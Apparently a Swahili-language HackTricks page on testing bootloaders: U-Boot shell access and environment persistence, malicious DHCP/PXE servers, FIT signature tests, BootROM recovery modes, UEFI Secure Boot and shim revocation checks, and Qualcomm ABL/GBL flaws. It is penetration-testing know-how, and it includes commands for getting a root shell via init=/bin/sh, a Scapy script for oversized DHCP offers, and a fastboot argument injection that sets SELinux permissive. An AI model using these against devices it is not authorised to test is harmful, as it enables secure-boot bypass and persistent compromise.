# Upimaji wa Bootloader

{{#include ../../banners/hacktricks-training.md}}

Hatua zifuatazo zinapendekezwa kwa kurekebisha mipangilio ya kuwasha kifaa na kupima bootloader kama U-Boot na bootloader za aina ya UEFI. Lenga kupata utekelezaji wa msimbo mapema, kutathmini ulinzi wa sahihi/rollback, na kutumia vibaya njia za recovery au network-boot.

Inahusiana: Bypass ya secure-boot ya MediaTek kupitia patching ya bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Mafanikio ya haraka ya U-Boot na matumizi mabaya ya mazingira

1. Fikia shell ya interpreter
   - Wakati wa boot, bonyeza kitufe kinachojulikana cha kusitisha (mara nyingi kitufe chochote, 0, space, au mfuatano maalum wa ubao) kabla ya `bootcmd` kutekelezwa ili kufikia prompt ya U-Boot.<sup>[[1]](#references)</sup>

2. Kagua hali ya boot na vigezo
   - Amri muhimu:
     - `printenv` (onyesha mazingira)
     - `bdinfo` (maelezo ya ubao, anwani za kumbukumbu)
     - `help bootm; help booti; help bootz` (mbinu za kuwasha kernel zinazotumika)
     - `help ext4load; help fatload; help tftpboot` (loaders zinazopatikana)

3. Rekebisha hoja za boot ili kupata shell ya root
   - Ongeza `init=/bin/sh` ili kernel ifungue shell badala ya init ya kawaida:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot kutoka kwenye TFTP server yako
   - Sanidi mtandao na upakue kernel/fit image kutoka LAN:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Fanya mabadiliko yadumu kupitia mazingira
   - Ikiwa hifadhi ya env haijalindwa dhidi ya uandishi, unaweza kudumisha udhibiti:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Angalia vigezo kama `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` vinavyoathiri njia za fallback. Thamani zisizosanidiwa vizuri zinaweza kuruhusu kuingia shell mara kwa mara.

6. Angalia vipengele vya debug/visivyo salama
   - Tafuta: `bootdelay` > 0, `autoboot` ikiwa imezimwa, `usb start; fatload usb 0:1 ...` isiyo na vizuizi, uwezo wa kutumia `loady`/`loads` kupitia serial, `env import` kutoka media isiyoaminika, na kernels/ramdisks zinazopakiwa bila ukaguzi wa saini.

7. Jaribio la picha/uthibitishaji wa U-Boot
   - Ikiwa jukwaa linadai kuwa na secure/verified boot kwa kutumia picha za FIT, jaribu picha zisizosainiwa na zilizobadilishwa:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Kukosekana kwa `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` au tabia ya zamani ya `verify=n` mara nyingi huruhusu kuwasha payload yoyote.
   - Usitosheke na matokeo rahisi ya kuruhusu/kukataa: utafiti wa hivi karibuni kuhusu FIT umeonyesha kuwa njia ya uthibitishaji yenyewe inaweza kuwa attack surface ya pre-auth. Fanya majaribio hasi kwenye data ya FIT iliyohifadhiwa nje (`data-offset`, `data-position`, `data-size`), uteuzi wa configuration iliyosainiwa, `loadables`, na ushughulikiaji wa overlay / `extra-conf`.
   - Ikiwa una source tree inayolingana, `test/vboot/vboot_test.sh` ni njia ya haraka ya kuiga tabia ya uthibitishaji wa FIT kwenye U-Boot sandbox kabla ya kugusa hardware halisi.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux`, na script bootflows
   - Kwenye build za kisasa za U-Boot, `bootcmd` mara nyingi ni wrapper tu ya Standard Boot. Hii inamaanisha media zinazoweza kuandikwa, PXE, au SPI flash zinaweza kuwa trust boundary halisi hata mazingira yanayoonekana yanaonekana salama.
   - `extlinux` bootmeth hutafuta `extlinux/extlinux.conf` chini ya `/` na `/boot`; script bootmeth hutafuta `boot.scr.uimg` kwanza, kisha `boot.scr`. Wakati wa kuwasha kupitia mtandao, jina la script linaweza kutoka kwa `boot_script_dhcp`.
   - Amri muhimu za triage:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Matukio ya matumizi mabaya ya kujaribu: media za USB/SD zinazodhibitiwa na mshambuliaji zilizotangulia kwenye `boot_targets`, ` /boot/extlinux/extlinux.conf` inayoweza kuandikwa, TFTP hasidi inayotoa `boot.scr`, au utekelezaji wa script kupitia SPI kwa kutumia `script_offset_f`.
   - Ikiwa jukwaa linategemea uthibitishaji wa FIT, hakikisha usanidi umesainiwa katika kiwango cha configuration na si kwa kila image pekee; `required-mode=all` ina usalama zaidi kuliko kukubali key yoyote moja inayohitajika.

## Uso wa netboot (DHCP/PXE) na servers hasidi

9. Fuzzing ya vigezo vya PXE/DHCP
   - Ushughulikiaji wa zamani wa BOOTP/DHCP wa U-Boot umekuwa na matatizo ya usalama wa kumbukumbu. Kwa mfano, CVE‑2024‑42040 inaeleza ufichuaji wa kumbukumbu kupitia majibu ya DHCP yaliyoundwa mahsusi, yanayoweza kuvuja byte kutoka kwenye kumbukumbu ya U-Boot na kuzituma kupitia mtandao.<sup>[[4]](#references)</sup> Jaribu njia za DHCP/PXE kwa kutumia thamani ndefu kupita kiasi au za hali za mipaka (jina la bootfile la option 67, vendor options, sehemu za file/servername) na uangalie kama mfumo unakwama au data inavuja.
   - Kipande kifupi cha Scapy cha kusisitiza vigezo vya boot wakati wa netboot:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Pia hakikisha kama sehemu za filename za PXE zinapitishwa kwa shell/loader logic bila kusafishwa zinapounganishwa na scripts za provisioning zilizo upande wa OS.

10. Upimaji wa command injection kupitia seva hasidi ya DHCP
   - Sanidi huduma hasidi ya DHCP/PXE na ujaribu kuingiza vibambo kwenye sehemu za filename au options ili kufikia interpreters za amri katika hatua za baadaye za mnyororo wa kuwasha. DHCP auxiliary ya Metasploit, `dnsmasq`, au scripts maalum za Scapy zinafaa. Hakikisha umetenga mtandao wa maabara kwanza.

## Njia za urejeshaji za SoC ROM zinazobatilisha kuwasha kwa kawaida

SoC nyingi hutoa hali ya "loader" ya BootROM inayopokea code kupitia USB/UART hata kama picha za flash si sahihi. Ikiwa fuse za secure-boot hazijachomwa, hali hii inaweza kutoa utekelezaji wa code ya kiholela mapema sana kwenye mnyororo.

- NXP i.MX (Serial Download Mode)
  - Zana: `uuu` (mfgtools3) au `imx-usb-loader`.
  - Mfano: `imx-usb-loader u-boot.imx` ili kutuma na kuendesha U-Boot maalum kutoka RAM.
- Allwinner (FEL)
  - Zana: `sunxi-fel`.
  - Mfano: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` au `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Zana: `rkdeveloptool`.
  - Mfano: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` ili kuweka loader kwenye hatua ya awali na kupakia U-Boot maalum.

Tathmini kama eFuses/OTP za secure-boot za kifaa zimechomwa. Ikiwa hazijachomwa, hali za upakuaji za BootROM mara nyingi hupita uthibitishaji wowote wa kiwango cha juu (U-Boot, kernel, rootfs) kwa kuendesha payload yako ya hatua ya kwanza moja kwa moja kutoka SRAM/DRAM.

## Ukaguzi wa haraka wa bootloaders za UEFI/PC

11. Upimaji wa ESP dhidi ya tampering, rollback na uandikishaji wa funguo
   - Mount EFI System Partition (ESP) na uangalie vipengele vya loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, na paths za nembo za vendor.
   - Dump hali ya Secure Boot na hifadhidata za funguo kutoka kwenye OS inapowezekana:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Ikiwa platform iko katika Setup Mode, inakubali usajili wa funguo bila uthibitishaji, au inasafirishwa ikiwa na Platform Key ya majaribio/chaguomsingi (daraja la PKfail), msimamizi wa ndani au mshambuliaji mwenye ufikiaji wa kimwili anaweza kusajili KEK/db yake na kufanya Secure Boot ionekane “imewezeshwa” huku akiwasha EFI binaries zozote.<sup>[[3]](#references)</sup>
   - Jaribu kuwasha kwa kutumia vipengele vya kuwasha vilivyotiwa saini vilivyoshushwa toleo au vinavyojulikana kuwa na udhaifu ikiwa revocations za Secure Boot (dbx) hazijasasishwa. Ikiwa platform bado inaziamini shims/bootmanagers za zamani, mara nyingi unaweza kupakia kernel yako au `grub.cfg` yako mwenyewe kutoka ESP ili kupata persistence.

12. Majaribio ya revocation za shim / SBAT / dbx zilizopitwa na wakati
   - Shims za zamani zilizosainiwa na Microsoft na forks za vendor bado zinaweza kuwa njia ya BYOVD-style bootkit ikiwa revocations zimepitwa na wakati. Katika lab iliyotengwa, weka shim iliyokuwa na udhaifu kihistoria kwenye ESP na ujaribu ku-chainload `grubx64.efi` au kernel yako mwenyewe.<sup>[[11]](#references)</sup>
   - Ukaguzi wa haraka:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Ikiwa shim bado inaendeshwa licha ya kuwa kwenye orodha ya revocation, firmware/OS ina masasisho ya `dbx` yaliyopitwa na wakati au inaamini loader forked ambayo haijawahi kurithi ulinzi wa SBAT wa upstream.

13. Hitilafu za uchanganuzi wa nembo ya boot (darasa la LogoFAIL)
   - Firmware kadhaa za OEM/IBV zilikuwa na udhaifu wa hitilafu za uchanganuzi wa picha katika DXE inayochakata nembo za boot. Ikiwa mshambulizi anaweza kuweka picha iliyoundwa kwa makusudi kwenye ESP chini ya njia mahususi ya vendor (k.m., `\EFI\<vendor>\logo\*.bmp`) na kuwasha upya kifaa, huenda akaweza kutekeleza msimbo wakati wa hatua za mwanzo za boot hata Secure Boot ikiwa imewashwa. Jaribu ikiwa jukwaa linakubali nembo zilizotolewa na mtumiaji na ikiwa njia hizo zinaweza kuandikiwa kutoka kwa OS.<sup>[[2]](#references)</sup>


## Mapengo ya uaminifu ya Android/Qualcomm ABL + GBL (Android 16)

Kwenye vifaa vya Android 16 vinavyotumia ABL ya Qualcomm kupakia **Generic Bootloader Library (GBL)**, hakiki ikiwa ABL **huthibitisha** UEFI app inayopakia kutoka kwenye partition ya `efisp`. Ikiwa ABL hukagua tu **uwepo** wa UEFI app bila kuthibitisha sahihi, uwezo wa kuandika kwenye `efisp` hugeuka kuwa **utekelezaji wa msimbo usiosainiwa kabla ya OS** wakati wa boot.<sup>[[6]](#references)[[7]](#references)</sup>

Ukaguzi wa vitendo na njia za matumizi mabaya:

- **uwezo wa kuandika kwenye efisp**: Unahitaji njia ya kuandika UEFI app maalum kwenye `efisp` (root/huduma yenye ruhusa za juu, hitilafu kwenye app ya OEM, njia ya recovery/fastboot). Bila hili, pengo la upakiaji wa GBL haliwezi kufikiwa moja kwa moja.<sup>[[6]](#references)</sup>
- **kuingiza argument za OEM kupitia fastboot** (hitilafu ya ABL): Baadhi ya builds hukubali tokeni za ziada katika `fastboot oem set-gpu-preemption` na kuziongeza kwenye cmdline ya kernel. Hili linaweza kutumiwa kulazimisha SELinux kuruhusu vitendo zaidi, na hivyo kuwezesha uandikaji kwenye partitions zilizolindwa:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Ikiwa kifaa kina viraka, amri inapaswa kukataa hoja za ziada.<sup>[[5]](#references)[[6]](#references)</sup>
- **Kufungua bootloader kupitia bendera zinazoendelea kuhifadhiwa**: Payload ya hatua ya boot inaweza kubadilisha bendera za kufungua zinazoendelea kuhifadhiwa (k.m., `is_unlocked=1`, `is_unlocked_critical=1`) ili kuiga `fastboot oem unlock` bila vizuizi vya seva/idhini ya OEM. Hali hii hubaki baada ya kuwasha upya.<sup>[[6]](#references)</sup>

Vidokezo vya ulinzi/triage:

- Thibitisha kama ABL hufanya uthibitishaji wa sahihi kwenye payload ya GBL/UEFI kutoka `efisp`. Ikiwa haifanyi hivyo, ichukulie `efisp` kama sehemu yenye hatari kubwa ya persistence.
- Fuatilia kama handlers za ABL fastboot OEM zimewekewa viraka ili **kuthibitisha idadi ya hoja** na kukataa tokeni za ziada.<sup>[[8]](#references)[[9]](#references)</sup>

## Tahadhari ya maunzi

Kuwa mwangalifu unaposhughulikia SPI/NAND flash wakati wa boot ya awali (k.m., kuweka pini ardhini ili kukwepa usomaji) na kila mara rejelea datasheet ya flash. Kufupisha pini kwa wakati usiofaa kunaweza kuharibu kifaa au programmer.

## Vidokezo na mbinu za ziada

- Jaribu `env export -t ${loadaddr}` na `env import -t ${loadaddr}` ili kuhamisha blob za mazingira kati ya RAM na hifadhi; baadhi ya majukwaa huruhusu kuingiza env kutoka kwenye media inayoweza kutolewa bila uthibitishaji.
- Kwa persistence kwenye mifumo inayotegemea Linux na kuwasha kupitia `extlinux.conf`, kurekebisha mstari wa `APPEND` (kuingiza `init=/bin/sh` au `rd.break`) kwenye sehemu ya boot mara nyingi hutosha pale ambapo hakuna ukaguzi wa sahihi unaotekelezwa.
- Ikiwa lengo linatumia masasisho ya dual-slot / A/B, kagua mbinu za anti-rollback na slot-desync katika [muhtasari wa uchanganuzi wa firmware](README.md) ili usikose mapengo ya uaminifu yanayohusu updater pekee nje ya bootloader yenyewe.
- Ikiwa userland inatoa `fw_printenv/fw_setenv`, thibitisha kuwa `/etc/fw_env.config` inalingana na hifadhi halisi ya env. Offset zilizosanidiwa vibaya zinaweza kukufanya usome/kuandika eneo lisilo sahihi la MTD.

## References

- [1] [Mbinu ya Kupima Usalama wa Firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Kugundua LogoFAIL: Hatari za kuchanganua picha wakati wa kuwasha mfumo](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Vifunguo vya Jukwaa Visivyoaminika Vinadhoofisha Secure Boot katika Mfumo wa UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Maelezo ya CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Kuzuiwa: Kufungua Xiaomi kupitia mifuatano miwili isiyosafishwa](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Exploit ya Qualcomm Snapdragon 8 Elite GBL inawaruhusu washambuliaji kufungua bootloader](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Usanifu wa Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Rekebisha uenezaji wa ingizo lisiloaminika kwenye kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: ongeza ukaguzi wa amri ya set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Haiwezi kuwasha: kuvunja uthibitishaji wa sahihi za FIT wa U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Notisi ya Udhaifu VU#616257 - Bootloader za UEFI shim zilizosainiwa na Microsoft ziko hatarini kukwepa Secure Boot](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
